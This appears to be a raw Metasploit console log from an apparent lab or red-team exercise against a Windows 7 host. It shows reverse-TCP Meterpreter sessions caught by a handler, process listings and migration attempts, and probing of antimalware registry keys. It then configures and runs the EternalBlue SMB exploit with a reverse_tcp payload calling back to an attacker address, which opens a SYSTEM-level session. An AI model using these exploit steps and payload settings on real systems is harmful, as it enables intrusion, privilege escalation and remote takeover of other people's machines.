+[0m[1m[31m[-][0m Error running command getuid: Rex::TimeoutError Operation timed out.
+[4mmeterpreter[0m > gets[K system
+[0m[1m[31m[-][0m Unknown command: get.
+[4mmeterpreter[0m > getsystem
+[0m[1m[31m[-][0m Error running command getsystem: Rex::TimeoutError Operation timed out.
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+
+[1m[34m[*][0m 10.10.100.77 - Meterpreter session 3 closed.  Reason: User exit
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> exitgetsystem system[P[P[P[Puidmigrate -P 908h[K9081968ps[Krun
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 0.0.0.0:15091 
+[1m[34m[*][0m Sending stage (206403 bytes) to 10.10.100.77
+[1m[34m[*][0m Meterpreter session 4 opened (10.10.20.151:15091 -> 10.10.100.77:56563) at 2019-04-08 10:47:19 -0400
+[0m[0m
+[0m[4mmeterpreter[0m > getuid
+[0mServer username: NT AUTHORITY\SYSTEM
+[4mmeterpreter[0m > load powershell
+[0mLoading extension powershell...
+[1m[34m[*][0m 10.10.100.77 - Meterpreter session 4 closed.  Reason: Died
+[1m[31m[-][0m Error running command load: Interrupt 
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> load powershell[P[P[P[P[P[P[P[P[Pgetuid[P[P[Prun
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 0.0.0.0:15091 
+[1m[34m[*][0m Sending stage (206403 bytes) to 10.10.100.77
+[1m[34m[*][0m Meterpreter session 5 opened (10.10.20.151:15091 -> 10.10.100.77:56566) at 2019-04-08 10:47:49 -0400
+[0m[0m
+[0m[4mmeterpreter[0m > ps
+[0m
+Process List
+============
+
+ PID   PPID  Name                      Arch  Session  User                          Path
+ ---   ----  ----                      ----  -------  ----                          ----
+ 0     0     [System Process]                                                       
+ 4     0     System                    x64   0                                      
+ 252   4     smss.exe                  x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 288   468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 316   468   SeaPort.EXE               x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Microsoft\BingBar\7.1.355.0\SeaPort.exe
+ 324   316   csrss.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 372   364   csrss.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 380   316   wininit.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 408   364   winlogon.exe              x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 468   380   services.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 476   380   lsass.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 484   380   lsm.exe                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 576   468   svchost.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 648   468   svchost.exe               x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 724   408   LogonUI.exe               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 740   936   winlogon.exe              x64   2        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 804   5540  ConEmuC64.exe             x64   2        STARWARS\administrator        C:\Program Files\ConEmu\ConEmu\ConEmuC64.exe
+ 848   468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 884   468   svchost.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 908   468   svchost.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 960   468   svchost.exe               x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 1092  936   csrss.exe                 x64   2        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 1100  468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1180  4560  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 1268  468   wmpnetwk.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Windows Media Player\wmpnetwk.exe
+ 1440  468   SearchIndexer.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
+ 1580  468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1660  468   svchost.exe               x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 1968  468   spoolsv.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 2080  468   taskhost.exe              x64   2        STARWARS\administrator        C:\Windows\system32\taskhost.exe
+ 2284  960   rdpclip.exe               x64   2        STARWARS\administrator        C:\Windows\system32\rdpclip.exe
+ 2368  2936  GoogleCrashHandler64.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Google\Update\1.3.34.7\GoogleCrashHandler64.exe
+ 2408  2936  GoogleCrashHandler.exe    x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Google\Update\1.3.34.7\GoogleCrashHandler.exe
+ 2420  884   dwm.exe                   x64   2        STARWARS\administrator        C:\Windows\system32\Dwm.exe
+ 2508  2400  explorer.exe              x64   2        STARWARS\administrator        C:\Windows\Explorer.EXE
+ 2764  2696  hpwuschd2.exe             x86   2        STARWARS\administrator        C:\Program Files (x86)\HP\HP Software Update\hpwuschd2.exe
+ 2832  5116  payload.exe               x64   2        NT AUTHORITY\SYSTEM           c:\payload.exe
+ 3568  4560  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 3604  468   AVGSvc.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\AVG\Antivirus\AVGSvc.exe
+ 3684  468   winlogbeat.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\winlogbeat\winlogbeat.exe
+ 3744  3960  ctfmon.exe                x64   2        STARWARS\administrator        C:\Windows\system32\ctfmon.exe
+ 3776  4560  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 3960  2508  AVGUI.exe                 x64   2        STARWARS\administrator        C:\Program Files\AVG\Antivirus\AVGUI.exe
+ 4104  468   svchost.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 4560  2508  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 4992  1092  conhost.exe               x64   2        STARWARS\administrator        C:\Windows\system32\conhost.exe
+ 5296  804   cmd.exe                   x64   2        STARWARS\administrator        C:\Windows\System32\cmd.exe
+ 5428  4560  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 5540  2508  ConEmu64.exe              x64   2        STARWARS\administrator        C:\Program Files\ConEmu\ConEmu64.exe
+ 5568  468   aswidsagent.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\AVG\Antivirus\aswidsagent.exe
+ 5648  3960  AVGUI.exe                 x64   2        STARWARS\administrator        C:\Program Files\AVG\Antivirus\AVGUI.exe
+ 5828  576   unsecapp.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\unsecapp.exe
+ 6084  4560  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+
+[4mmeterpreter[0m > migrate 1968
+[0m[1m[34m[*][0m Migrating from 2832 to 1968...
+[1m[31m[-][0m Error running command migrate: Rex::TimeoutError Operation timed out.
+[4mmeterpreter[0m > shell
+[0m[1m[31m[-][0m Error running command shell: Rex::TimeoutError Operation timed out.
+[4mmeterpreter[0m > shell
+[0m[1m[31m[-][0m Error running command shell: Rex::TimeoutError Operation timed out.
+[4mmeterpreter[0m > shellmigrate 1968
+[0m[1m[31m[-][0m Error running command migrate: NoMethodError undefined method `pid' for nil:NilClass
+[4mmeterpreter[0m > run wmic -c "service where (state='running') list brief"
+[0m
+[1m[33m[!][0m Meterpreter scripts are deprecated. Try post/windows/gather/wmic_command.
+[1m[33m[!][0m Example: run post/windows/gather/wmic_command OPTION=value [...]
+[1m[34m[*][0m Error running WMIC commands: Rex::TimeoutError Operation timed out.
+[4mmeterpreter[0m > reg enumkey -k "HKLM\\software\\microsoft\\microsoft antimalware"
+[0m[1m[31m[-][0m Error running command reg: Interrupt 
+[4mmeterpreter[0m > reg enumkey
+[0mUsage: reg [command] [options]
+Interact with the target machine's registry.
+
+OPTIONS:
+
+    -d <opt>  The data to store in the registry value.
+    -h        Help menu.
+    -k <opt>  The registry key path (E.g. HKLM\Software\Foo).
+    -r <opt>  The remote machine name to connect to (with current process credentials
+    -t <opt>  The registry value type (E.g. REG_SZ).
+    -v <opt>  The registry value name (E.g. Stuff).
+    -w        Set KEY_WOW64 flag, valid values [32|64].
+COMMANDS:
+
+    enumkey  Enumerate the supplied registry key [-k <key>]
+    createkey  Create the supplied registry key  [-k <key>]
+    deletekey  Delete the supplied registry key  [-k <key>]
+    queryclass Queries the class of the supplied key [-k <key>]
+    setval Set a registry value [-k <key> -v <val> -d <data>]
+    deleteval  Delete the supplied registry value [-k <key> -v <val>]
+    queryval Queries the data contents of a value [-k <key> -v <val>]
+
+[4mmeterpreter[0m > reg enumkey -k "HKLM\\software\\microsoft\\microsoft antimalware"[P"[P"[P"[P"[P"[P"[P"[P"[P"[P"[P"[P"[P"[P"[P"[P"[P"[P"[P"[P"[P"[P"[P"
+[0m[1m[31m[-][0m Error running command reg: Rex::TimeoutError Operation timed out.
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+
+[1m[34m[*][0m 10.10.100.77 - Meterpreter session 5 closed.  Reason: User exit
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> use exploit/windows/smb/ms1
+use exploit/windows/smb/ms10_046_shortcut_icon_dllloader  use exploit/windows/smb/ms17_010_eternalblue
+use exploit/windows/smb/ms10_061_spoolss                  use exploit/windows/smb/ms17_010_eternalblue_win8
+use exploit/windows/smb/ms15_020_shortcut_icon_dllloader  use exploit/windows/smb/ms17_010_psexec
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> use exploit/windows/smb/ms1
+use exploit/windows/smb/ms10_046_shortcut_icon_dllloader  use exploit/windows/smb/ms17_010_eternalblue
+use exploit/windows/smb/ms10_061_spoolss                  use exploit/windows/smb/ms17_010_eternalblue_win8
+use exploit/windows/smb/ms15_020_shortcut_icon_dllloader  use exploit/windows/smb/ms17_010_psexec
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> use exploit/windows/smb/ms17_010_eternalblue
+[0m[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show options 
+[0m
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOST                           yes       The target address
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set payload windows/x64/d[Kmeterpreter/reverse_tcp
+[0mpayload => windows/x64/meterpreter/reverse_tcp
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show top
+[0m[1m[31m[-][0m Invalid parameter "top", use "show -h" for more information
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show options 
+[0m
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOST                           yes       The target address
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set rhost 10.10.100.77
+[0mrhost => 10.10.100.77
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set lhost 10.10.20151[K[K[K.151
+[0mlhost => 10.10.20.151
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.20.151:4444 
+[1m[34m[*][0m 10.10.100.77:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 10.10.100.77:445 - Connection established for exploitation.
+[1m[32m[+][0m 10.10.100.77:445 - Target OS selected valid for OS indicated by SMB reply
+[1m[34m[*][0m 10.10.100.77:445 - CORE raw buffer dump (23 bytes)
+[1m[34m[*][0m 10.10.100.77:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
+[1m[34m[*][0m 10.10.100.77:445 - 0x00000010  74 65 20 37 36 30 30                             te 7600         
+[1m[32m[+][0m 10.10.100.77:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[1m[34m[*][0m 10.10.100.77:445 - Trying exploit with 12 Groom Allocations.
+[1m[34m[*][0m 10.10.100.77:445 - Sending all but last fragment of exploit packet
+[1m[31m[-][0m 10.10.100.77:445 - RubySMB::Error::CommunicationError: Read timeout expired when reading from the Socket (timeout=30)
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.20.151:4444 
+[1m[34m[*][0m 10.10.100.77:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 10.10.100.77:445 - Connection established for exploitation.
+[1m[32m[+][0m 10.10.100.77:445 - Target OS selected valid for OS indicated by SMB reply
+[1m[34m[*][0m 10.10.100.77:445 - CORE raw buffer dump (23 bytes)
+[1m[34m[*][0m 10.10.100.77:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
+[1m[34m[*][0m 10.10.100.77:445 - 0x00000010  74 65 20 37 36 30 30                             te 7600         
+[1m[32m[+][0m 10.10.100.77:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[1m[34m[*][0m 10.10.100.77:445 - Trying exploit with 12 Groom Allocations.
+[1m[34m[*][0m 10.10.100.77:445 - Sending all but last fragment of exploit packet
+[1m[31m[-][0m 10.10.100.77:445 - RubySMB::Error::CommunicationError: Read timeout expired when reading from the Socket (timeout=30)
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.20.151:4444 
+[1m[34m[*][0m 10.10.100.77:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 10.10.100.77:445 - Connection established for exploitation.
+[1m[32m[+][0m 10.10.100.77:445 - Target OS selected valid for OS indicated by SMB reply
+[1m[34m[*][0m 10.10.100.77:445 - CORE raw buffer dump (23 bytes)
+[1m[34m[*][0m 10.10.100.77:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
+[1m[34m[*][0m 10.10.100.77:445 - 0x00000010  74 65 20 37 36 30 30                             te 7600         
+[1m[32m[+][0m 10.10.100.77:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[1m[34m[*][0m 10.10.100.77:445 - Trying exploit with 12 Groom Allocations.
+[1m[34m[*][0m 10.10.100.77:445 - Sending all but last fragment of exploit packet
+[1m[34m[*][0m 10.10.100.77:445 - Starting non-paged pool grooming
+[1m[32m[+][0m 10.10.100.77:445 - Sending SMBv2 buffers
+[1m[32m[+][0m 10.10.100.77:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[1m[34m[*][0m 10.10.100.77:445 - Sending final SMBv2 buffers.
+[1m[34m[*][0m 10.10.100.77:445 - Sending last fragment of exploit packet!
+[1m[34m[*][0m 10.10.100.77:445 - Receiving response from exploit packet
+[1m[32m[+][0m 10.10.100.77:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[1m[34m[*][0m 10.10.100.77:445 - Sending egg to corrupted connection.
+[1m[34m[*][0m 10.10.100.77:445 - Triggering free of corrupted buffer.
+[1m[34m[*][0m Sending stage (206403 bytes) to 10.10.100.77
+[1m[34m[*][0m Meterpreter session 6 opened (10.10.20.151:4444 -> 10.10.100.77:56621) at 2019-04-08 11:30:27 -0400
+[0m[0m[1m[32m[+][0m 10.10.100.77:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 10.10.100.77:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 10.10.100.77:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+[0m[4mmeterpreter[0m > ps
+[0m
+Process List
+============
+
+ PID   PPID  Name                      Arch  Session  User                          Path
+ ---   ----  ----                      ----  -------  ----                          ----
+ 0     0     [System Process]                                                       
+ 4     0     System                    x64   0                                      
+ 252   4     smss.exe                  x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 288   468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    
+ 316   468   SeaPort.EXE               x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Microsoft\BingBar\7.1.355.0\SeaPort.exe
+ 324   316   csrss.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 372   364   csrss.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 380   316   wininit.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 408   364   winlogon.exe              x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 468   380   services.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 476   380   lsass.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 484   380   lsm.exe                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 576   468   svchost.exe               x64   0        NT AUTHORITY\SYSTEM           
+ 648   468   svchost.exe               x64   0        NT AUTHORITY\NETWORK SERVICE  
+ 724   408   LogonUI.exe               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 740   936   winlogon.exe              x64   2        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 804   5540  ConEmuC64.exe             x64   2        STARWARS\administrator        C:\Program Files\ConEmu\ConEmu\ConEmuC64.exe
+ 848   468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    
+ 884   468   svchost.exe               x64   0        NT AUTHORITY\SYSTEM           
+ 908   468   svchost.exe               x64   0        NT AUTHORITY\SYSTEM           
+ 960   468   svchost.exe               x64   0        NT AUTHORITY\NETWORK SERVICE  
+ 1092  936   csrss.exe                 x64   2        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 1100  468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    
+ 1180  4560  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 1268  468   wmpnetwk.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  
+ 1440  468   SearchIndexer.exe         x64   0        NT AUTHORITY\SYSTEM           
+ 1580  468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    
+ 1660  468   svchost.exe               x64   0        NT AUTHORITY\NETWORK SERVICE  
+ 1968  468   spoolsv.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 2080  468   taskhost.exe              x64   2        STARWARS\administrator        C:\Windows\system32\taskhost.exe
+ 2284  960   rdpclip.exe               x64   2        STARWARS\administrator        C:\Windows\system32\rdpclip.exe
+ 2368  2936  GoogleCrashHandler64.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Google\Update\1.3.34.7\GoogleCrashHandler64.exe
+ 2408  2936  GoogleCrashHandler.exe    x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Google\Update\1.3.34.7\GoogleCrashHandler.exe
+ 2420  884   dwm.exe                   x64   2        STARWARS\administrator        C:\Windows\system32\Dwm.exe
+ 2508  2400  explorer.exe              x64   2        STARWARS\administrator        C:\Windows\Explorer.EXE
+ 2764  2696  hpwuschd2.exe             x86   2        STARWARS\administrator        C:\Program Files (x86)\HP\HP Software Update\hpwuschd2.exe
+ 3568  4560  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 3604  468   AVGSvc.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\AVG\Antivirus\AVGSvc.exe
+ 3684  468   winlogbeat.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\winlogbeat\winlogbeat.exe
+ 3744  3960  ctfmon.exe                x64   2        STARWARS\administrator        C:\Windows\system32\ctfmon.exe
+ 3776  4560  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 3960  2508  AVGUI.exe                 x64   2        STARWARS\administrator        C:\Program Files\AVG\Antivirus\AVGUI.exe
+ 4560  2508  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 4992  1092  conhost.exe               x64   2        STARWARS\administrator        C:\Windows\system32\conhost.exe
+ 5296  804   cmd.exe                   x64   2        STARWARS\administrator        C:\Windows\System32\cmd.exe
+ 5428  4560  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+ 5540  2508  ConEmu64.exe              x64   2        STARWARS\administrator        C:\Program Files\ConEmu\ConEmu64.exe
+ 6084  4560  chrome.exe                x64   2        STARWARS\administrator        C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
+
+[4mmeterpreter[0m > migrate 1968
+[0m[1m[31m[-][0m Process already running at PID 1968
+[4mmeterpreter[0m > load powershell
+[0mLoading extension powershell...
+[1m[34m[*][0m 10.10.100.77 - Meterpreter session 6 closed.  Reason: Died
+
+[1m[31m[-][0m Failed to load extension: No response was received to the core_loadlib request.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> apt-get update
+[0m[1m[34m[*][0m exec: apt-get update
+
+Get:2 https://packages.microsoft.com/repos/microsoft-debian-stretch-prod stretch InRelease [3,231 B]
+Get:1 http://archive.linux.duke.edu/kalilinux/kali kali-rolling InRelease [30.5 kB]
+Get:3 https://packages.microsoft.com/repos/microsoft-debian-stretch-prod stretch/main amd64 Packages [43.4 kB]
+Get:4 http://archive.linux.duke.edu/kalilinux/kali kali-rolling/main i386 Packages [16.9 MB]
+Get:5 http://archive.linux.duke.edu/kalilinux/kali kali-rolling/main amd64 Packages [17.0 MB]
+Get:6 http://archive.linux.duke.edu/kalilinux/kali kali-rolling/contrib i386 Packages [96.8 kB]
+Get:7 http://archive.linux.duke.edu/kalilinux/kali kali-rolling/contrib amd64 Packages [105 kB]
+Get:8 http://archive.linux.duke.edu/kalilinux/kali kali-rolling/non-free amd64 Packages [187 kB]
+Get:9 http://archive.linux.duke.edu/kalilinux/kali kali-rolling/non-free i386 Packages [164 kB]
+Fetched 34.6 MB in 15s (2,380 kB/s)
+Reading package lists...
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> apt-get ud[Kg[Kpgrade
+[0m[1m[34m[*][0m exec: apt-get upgrade
+
+Reading package lists...
+Building dependency tree...
+Reading state information...
+Calculating upgrade...
+The following packages were automatically installed and are no longer required:
+  gdal-bin gdal-data libaec0 libarmadillo9 libarpack2 libboost-atomic1.62.0 libboost-chrono1.62.0 libboost-date-time1.62.0
+  libboost-filesystem1.62.0 libboost-program-options1.62.0 libboost-python1.62.0 libboost-serialization1.62.0
+  libboost-system1.62.0 libboost-test1.62.0 libboost-thread1.62.0 libboost-timer1.62.0 libcgal13 libcharls1 libcrypt2 libdap25
+  libdapclient6v5 libdapserver7v5 libdee-1.0-4 libenca0 libepsilon1 libfcgi-bin libfcgi0ldbl libfreexl1 libfyba0 libgdal20
+  libgdbm5 libgeotiff2 libgmime-3.0-0 libgtk2-perl libhdf4-0-alt libhdf5-100 libkmlbase1 libkmlconvenience1 libkmldom1
+  libkmlengine1 libkmlregionator1 libkmlxsd1 liblwgeom-2.5-0 liblwgeom-dev libminizip1 libnetcdf13 libogdi3.2 libopencv-core3.2
+  libopencv-imgproc3.2 libpango-perl libpyside1.2 libqca2 libqca2-plugins libqgis-analysis2.18.25 libqgis-core2.18.25
+  libqgis-customwidgets libqgis-gui2.18.25 libqgis-networkanalysis2.18.25 libqgis-server2.18.25 libqgispython2.18.25 libqhull7
+  libqtwebkit4 libqwt6abi1 libsfcgal1 libshiboken1.2v5 libspatialindex4v5 libspatialite7 libsuperlu5 libsz2 libtbb2 liburiparser1
+  libwhisker2-perl libxerces-c3.2 libzeitgeist-2.0-0 odbcinst odbcinst1debian2 openbox-menu python-backports.functools-lru-cache
+  python-cycler python-gdal python-kiwisolver python-matplotlib python-owslib python-pam python-pyproj python-pyside.qtcore
+  python-pyside.qtgui python-pyside.qtnetwork python-pyside.qtwebkit python-pyspatialite python-qgis python-qgis-common
+  python-qt4-sql python-shapely python-subprocess32 qt4-designer ruby-faraday x11proto-dri2-dev x11proto-gl-dev zeitgeist-core
+Use 'apt autoremove' to remove them.
+The following packages have been kept back:
+  backdoor-factory beef-xss build-essential clang cpp cpp-8 default-mysql-server dmeventd dradis eog firefox-esr g++ g++-8
+  g++-8-multilib g++-multilib gcc gcc-8 gcc-8-base gcc-8-base:i386 gcc-8-multilib gcc-multilib gdal-bin gdb gir1.2-freedesktop
+  gir1.2-glib-2.0 gjs glusterfs-common gnome-settings-daemon gnome-shell gnome-shell-common gnome-shell-extension-desktop-icons
+  gnome-software gnome-software-common gnome-sushi gvfs gvfs-backends gvfs-common gvfs-daemons gvfs-fuse gvfs-libs hydra hydra-gtk
+  icedtea-netx icu-devtools initramfs-tools initramfs-tools-core iptables irqbalance isc-dhcp-client kali-desktop-common
+  kali-linux king-phisher lib32asan5 lib32atomic1 lib32gcc-8-dev lib32gcc1 lib32gomp1 lib32itm1 lib32mpx2 lib32quadmath0
+  lib32stdc++-8-dev lib32stdc++6 lib32ubsan1 libasan5 libatomic1 libatomic1:i386 libcc1-0 libdbd-mysql-perl libenchant1c2a
+  libgcc-8-dev libgcc1 libgcc1:i386 libgdal20 libgeos-c1v5 libgfortran5 libgjs0g libgl1-mesa-dri libgl1-mesa-dri:i386
+  libglapi-mesa libglapi-mesa:i386 libglib2.0-0 libglib2.0-0:i386 libglib2.0-bin libglib2.0-dev libglib2.0-dev-bin libglx-mesa0
+  libglx-mesa0:i386 libgomp1 libgomp1:i386 libicu-dev libicu63 libicu63:i386 libip4tc0 libip6tc0 libiptc0 libitm1 liblsan0
+  libmagickcore-6.q16-6 libmagickcore-6.q16-6-extra libmagickwand-6.q16-6 libmailutils5 libmariadbclient18 libmpx2 libnetcdf13
+  libobjc-8-dev libobjc4 libodbc1 libomp-dev libomp5 libosmesa6 libosmesa6:i386 libpeas-1.0-0 libpoppler-glib8 libpython3-dev
+  libpython3-stdlib libqgis-customwidgets libqt4-dbus libqt4-declarative libqt4-designer libqt4-dev libqt4-dev-bin libqt4-help
+  libqt4-network libqt4-opengl libqt4-opengl-dev libqt4-qt3support libqt4-script libqt4-scripttools libqt4-sql libqt4-sql-mysql
+  libqt4-svg libqt4-test libqt4-xml libqt4-xmlpatterns libqt5charts5 libqt5core5a libqt5dbus5 libqt5designer5 libqt5gui5
+  libqt5multimedia5 libqt5multimedia5-plugins libqt5multimediagsttools5 libqt5multimediawidgets5 libqt5network5 libqt5opengl5
+  libqt5positioning5 libqt5printsupport5 libqt5qml5 libqt5quick5 libqt5script5 libqt5sensors5 libqt5sql5 libqt5sql5-sqlite
